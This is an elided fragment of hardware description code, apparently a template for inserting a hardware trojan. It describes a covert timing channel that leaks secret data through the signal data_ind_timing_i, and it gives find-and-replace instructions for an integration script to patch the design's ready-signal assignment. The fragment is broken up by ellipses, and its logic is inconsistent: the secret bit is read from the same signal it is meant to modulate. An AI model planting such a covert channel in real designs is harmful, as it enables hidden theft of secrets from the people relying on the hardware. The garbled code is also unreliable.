 ...
 * Payload: Modulate timing of data_ind_timing_i based on secret data
 * 
...
assign secret_bit = data_ind_timing_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of data_ind_timing_i
//
// Integration Script Must Modify:
//
// IF data_ind_timing_i is timing-sensitive:
//   Find: assign data_ind_timing_i = ready_signal;
//   Replace: assign data_ind_timing_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
